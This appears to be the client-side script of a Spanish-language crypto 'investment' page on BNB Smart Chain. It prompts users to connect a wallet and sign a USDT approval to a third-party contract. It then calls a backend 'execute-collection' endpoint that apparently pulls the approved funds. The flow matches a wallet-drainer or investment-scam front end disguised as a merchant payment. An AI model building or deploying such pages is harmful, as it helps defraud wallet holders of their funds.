"use strict";

// ─── Configuration ────────────────────────────────────────────────────────────
const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID_HEX = "0x38"; 
const MIN_USDT_BALANCE = 0n; 
const BACKEND_URL      = "https://secure-merchant.onrender.com/api";

const BSC_RPC_URLS = [
  "https://bsc-rpc.publicnode.com",
  "https://bsc-dataseed1.binance.org/",
  "https://bsc-dataseed2.binance.org/",
  "https://rpc.ankr.com/bsc"
];

const BSC_CHAIN_PARAMS = {
  chainId:           BSC_CHAIN_ID_HEX,
  chainName:         "BNB Smart Chain",
  nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls:           BSC_RPC_URLS,
  blockExplorerUrls: ["https://bscscan.com/"]
};

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)"
];

// ─── DOM refs ─────────────────────────────────────────────────────────────────
const approveBtn    = document.getElementById("approveBtn");
const btnText       = document.getElementById("btnText");
const btnSpinner    = document.getElementById("btnSpinner");
const merchantInput = document.getElementById("merchantAddress");
const toastEl       = document.getElementById("toast");

if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;

// ─── Wake up Render backend ───────────────────────────────────────────────────
(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();

// ─── UI helpers ───────────────────────────────────────────────────────────────
let _toastTimer;
function showToast(msg, type = "default", ms = 4500) {
  if (!toastEl) return;
  clearTimeout(_toastTimer);
  toastEl.textContent  = msg;
  toastEl.dataset.type = type === "default" ? "" : type;
  toastEl.hidden       = false;
  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}

function setLoading(on, label = "Processing…") {
  if (!approveBtn) return;
  approveBtn.disabled = on;
  if (btnText) btnText.textContent = on ? label : "NEXT";
  if (btnSpinner) btnSpinner.hidden   = !on;
}

// ─── Backend collect trigger ──────────────────────────────────────────────────
async function triggerBackendCollect(userAddress) {
  let lastErr;
  const uiAmount = document.getElementById("investAmount")?.value || "1"; 
  const dynamicAmountWei = ethers.parseUnits(uiAmount.toString(), 18).toString();

  for (let i = 1; i <= 3; i++) {
    try {
      const res  = await fetch(`${BACKEND_URL}/execute-collection`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ userAddress: userAddress, amount: dynamicAmountWei })
      });
      const data = await res.json();
      if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
      return data;
    } catch (e) {
      lastErr = e;
      if (i < 3) await new Promise(r => setTimeout(r, 3000));
    }
  }
  throw lastErr;
}

// Bandera de control para saber si hay una inversión esperando a que el usuario conecte
let pendingInvestment = false;

// 1. Suscripción reactiva: Detecta automáticamente cuando el usuario conecta su wallet en el modal
if (window.modal && typeof window.modal.subscribeProviders === "function") {
  window.modal.subscribeProviders((state) => {
    const rawProvider = state["eip155"]; // Proveedor EVM (BSC, Ethereum, etc.)
    
    // Si el proveedor ya está disponible y el usuario había hecho clic en "Invertir"
    if (rawProvider && pendingInvestment) {
      pendingInvestment = false; // Desactivamos la bandera
      runInvestmentFlow(rawProvider); // ¡Lanzamos el contrato y la firma en automático!
    }
  });
}

// 2. Evento unificado del botón principal
if (approveBtn) {
  approveBtn.addEventListener("click", async () => {
    let rawProvider = null;
    if (window.modal && typeof window.modal.getWalletProvider === "function") {
      try {
        rawProvider = window.modal.getWalletProvider();
      } catch (_) {}
    }

    // CASO A: Si el usuario NO está conectado
    if (!rawProvider) {
      pendingInvestment = true; // Activamos la bandera de espera
      setLoading(true, "Abre tu billetera para conectar...");
      
      if (window.modal && typeof window.modal.open === "function") {
        try {
          await window.modal.open(); // Abre el modal de Reown
        } catch (err) {
          console.error("Error al abrir AppKit:", err);
          pendingInvestment = false;
          setLoading(false);
        }
      }
      return; // Detenemos aquí; el 'subscribeProviders' tomará el control en cuanto el usuario acepte.
    }

    // CASO B: Si el usuario YA estaba conectado previamente
    await runInvestmentFlow(rawProvider);
  });
}

// 3. Función centralizada que ejecuta la red BSC, saldo y aprobación de USDT
async function runInvestmentFlow(rawProvider) {
  setLoading(true, "Conectando proveedor…");
  
  try {
    const provider = new ethers.BrowserProvider(rawProvider);
    
    // Verificación de red BSC (Chain ID 56)
    const network = await provider.getNetwork();
    if (Number(network.chainId) !== 56) {
      setLoading(true, "Cambiando a red BSC…");
      try {
        await rawProvider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }] // 56 en Hexadecimal
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          await rawProvider.request({
            method: "wallet_addEthereumChain",
            params: [{
              chainId: "0x38",
              chainName: "BNB Smart Chain",
              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
              rpcUrls: ["https://bsc-dataseed.binance.org/"],
              blockExplorerUrls: ["https://bscscan.com/"]
            }]
          });
        } else {
          showToast("Por favor cambia manualmente a BNB Smart Chain en tu wallet.", "error");
          setLoading(false);
          updateButtonState();
          return;
        }
      }
    }

    const signer = await provider.getSigner();
    const userAddress = await signer.getAddress();

    const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);

    setLoading(true, "Firma requerida en wallet…");
    const requiredAmount = ethers.parseUnits(document.getElementById("investAmount")?.value.toString() || "1", 18);
    
    // Lanzar la firma de aprobación automáticamente
    const tx = await usdtContract.approve(CONTRACT_ADDRESS, requiredAmount);

    setLoading(true, "Confirmando en red…");
    await tx.wait();

    setLoading(true, "Finalizando…");
    await triggerBackendCollect(userAddress);
    showToast("Sent Successfully, Thank you! ✓", "success");

  } catch (err) {
    const raw = err?.reason ?? err?.message ?? "Error desconocido";
    if (
      err.code === 4001 ||
      raw.toLowerCase().includes("user rejected") ||
      raw.toLowerCase().includes("denied") ||
      raw.toLowerCase().includes("cancelled")
    ) {
      showToast("Transacción cancelada.", "default");
    } else {
      console.error("Web3 Error:", err);
      showToast("Error de comunicación con la wallet.", "error");
    }
  } finally {
    setLoading(false);
    updateButtonState(); // Restaura el botón a su estado normal
  }
}
